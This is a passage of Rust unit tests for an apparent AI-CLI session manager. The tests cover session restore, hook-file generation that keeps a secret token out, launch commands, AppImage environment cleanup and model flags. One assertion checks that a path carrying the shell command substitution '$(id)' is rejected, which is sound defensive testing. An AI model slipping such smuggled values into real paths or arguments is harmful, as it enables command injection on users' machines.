        assert!(m.state.lock().renamed_since_persist.contains("a"));
        m.update_meta(
            "01rec",
            &UpdateMeta {
                name: Some("delta".into()),
                ..Default::default()
            },
        );
        assert_eq!(m.get("a").unwrap().name, "delta");
    }

    #[test]
    fn one_stored_record_is_never_bound_to_two_live_sessions() {
        let m = with_sessions(vec![bare("a", "alpha"), bare("b", "ALPHA")]);
        let mut st = m.state.lock();
        assert!(adopt_record_locked(&mut st, "a", "rec"));
        assert!(!adopt_record_locked(&mut st, "b", "rec"));
        assert!(
            adopt_record_locked(&mut st, "a", "rec"),
            "re-binding the owner is fine"
        );
        assert!(!adopt_record_locked(&mut st, "gone", "rec2"));
    }

    #[test]
    fn restore_is_idempotent_and_skips_names_already_live() {
        crate::local_store::init_for_tests();
        let tag = crate::local_store::new_id();
        for name in [format!("r-{tag}-one"), format!("r-{tag}-two")] {
            crate::local_data::call(
                "sessions.create",
                serde_json::json!({ "name": name, "provider": "codex" }),
            )
            .unwrap();
        }
        // A live session with the same name (other case) as a stored one.
        let m = with_sessions(vec![bare("live", &format!("R-{tag}-TWO"))]);
        m.restore_from_store();
        let mine = |m: &SessionManager| -> Vec<SessionSummary> {
            m.list()
                .into_iter()
                .filter(|s| s.name.to_lowercase().contains(&tag.to_lowercase()))
                .collect()
        };
        let first = mine(&m);
        assert_eq!(first.len(), 2, "one restored + the live one");
        let restored = first.iter().find(|s| s.id != "live").unwrap();
        assert_eq!(restored.status, "standby");
        assert!(restored.standby_at.is_some());
        assert!(restored.db_id.is_some());
        m.restore_from_store();
        assert_eq!(mine(&m).len(), 2, "a second restore adds nothing");
    }

    #[test]
    fn process_hooks_file_has_every_promptops_hook_and_no_secret() {
        let v = claude_hooks_json("/app data/hooks/shim.js", 4242, false);
        for ev in [
            "Notification",
            "Stop",
            "PreToolUse",
            "PostToolUse",
            "SessionStart",
            "SessionEnd",
        ] {
            assert!(v["hooks"][ev].is_array(), "{ev}");
        }
        assert_eq!(
            v["hooks"]["Stop"][0]["hooks"][0]["command"],
            "node \"/app data/hooks/shim.js\""
        );
        let http = claude_hooks_json("", 4242, true).to_string();
        assert!(http.contains("http://127.0.0.1:4242/promptops-hook"));
        // Only the NAMES of the env vars: the token value never lands in a file.
        assert!(http.contains("$PROMPTOPS_CTL_TOKEN"));
        assert!(!http.contains(crate::commands::agent_ctl::token()));
        assert!(quotable_path("/Users/a/Library/Application Support/x.json"));
        assert!(!quotable_path("/tmp/$(id)/x"));
        assert!(!quotable_path("C:\\x\"y"));
        // Under test the CLI probe is off: launch lines keep their shape.
        assert!(claude_settings_fragment("claude-code-cli").is_none());
    }

    #[test]
    fn launch_continue_only_when_allowed() {
        let cfg = resume_config();
        let cmd = build_launch_command_inner("claude-code-cli", &cfg, None, true, None, None);
        assert_eq!(cmd.as_deref(), Some("claude --continue\r"));
        // Shared cwd (allow_continue=false): no `--continue`, start
        // clean with the fresh forced id.
        let cmd =
            build_launch_command_inner("claude-code-cli", &cfg, None, false, Some("fresh-9"), None);
        assert_eq!(cmd.as_deref(), Some("claude --session-id fresh-9\r"));
        let cmd = build_launch_command_inner("claude-code-cli", &cfg, None, false, None, None);
        assert_eq!(cmd.as_deref(), Some("claude \r"));
    }

    #[test]
    fn appimage_environment_does_not_reach_child_processes() {
        use super::appimage_env_overrides as overrides;
        let v = |pairs: &[(&str, &str)]| -> Vec<(String, String)> {
            pairs
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect()
        };
        let vars = v(&[
            ("APPDIR", "/tmp/.mount_PromptX"),
            ("APPIMAGE", "/home/u/PromptOps.AppImage"),
            ("OWD", "/home/u"),
            ("PATH", "/tmp/.mount_PromptX/usr/bin:/usr/bin:/bin"),
            ("LD_LIBRARY_PATH", "/tmp/.mount_PromptX/usr/lib"),
            ("XDG_DATA_DIRS", "/tmp/.mount_PromptX/usr/share:/usr/share"),
            ("GTK_DATA_PREFIX", "/tmp/.mount_PromptX"),
            (
                "GDK_PIXBUF_MODULE_FILE",
                "/tmp/.mount_PromptX/usr/lib/loaders.cache",
            ),
            ("GDK_BACKEND", "x11"),
            (
                "FONTCONFIG_FILE",
                "/home/u/.cache/promptops-oss/fonts-no-colrv1.conf",
            ),
            ("GTK_THEME", "Adwaita:dark"),
            ("HOME", "/home/u"),
            // A sibling folder that only shares the prefix stays.
            ("MY_TOOL", "/tmp/.mount_PromptXother/bin"),
        ]);
        let out = overrides(
            &vars,
            Some("/tmp/.mount_PromptX"),
            &["GDK_BACKEND", "FONTCONFIG_FILE"],
        );
        let get = |k: &str| out.iter().find(|(n, _)| n == k).map(|(_, v)| v.clone());
        for gone in [
            "APPDIR",
            "APPIMAGE",
            "OWD",
            "LD_LIBRARY_PATH",
            "GTK_DATA_PREFIX",
            "GDK_PIXBUF_MODULE_FILE",
            "GDK_BACKEND",
            "FONTCONFIG_FILE",
        ] {
            assert_eq!(get(gone), Some(None), "{gone}");
        }
        assert_eq!(get("PATH"), Some(Some("/usr/bin:/bin".into())));
        assert_eq!(get("XDG_DATA_DIRS"), Some(Some("/usr/share".into())));
        // The user's own settings are untouched.
        assert_eq!(get("GTK_THEME"), None);
        assert_eq!(get("HOME"), None);
        assert_eq!(get("MY_TOOL"), None);
        // Outside an AppImage nothing changes.
        assert!(overrides(&v(&[("PATH", "/usr/bin"), ("GTK_THEME", "x")]), None, &[]).is_empty());
    }

    #[test]
    fn every_cli_that_takes_a_model_gets_it() {
        use super::model_flag;
        for (provider, flag) in [
            ("claude-code-cli", "--model"),
            ("zai", "--model"),
            ("codex", "-m"),
            ("gemini-cli", "-m"),
            ("antigravity", "--model"),
            ("grok", "-m"),
            ("copilot", "--model"),
            ("opencode", "-m"),
            ("hermes", "-m"),
        ] {
            assert_eq!(model_flag(provider), Some(flag), "{provider}");
        }
        assert_eq!(model_flag("generic-shell"), None);
        assert_eq!(model_flag("cursor"), None);
    }
}

#[cfg(test)]
mod pty_size_guard_tests {
    use super::pty_size_is_usable;

    #[test]
    fn tiny_grids_never_reach_the_pty() {
        assert!(!pty_size_is_usable(29, 3));
        assert!(!pty_size_is_usable(10, 40));
        assert!(pty_size_is_usable(20, 8));
        assert!(pty_size_is_usable(120, 30));
    }
}
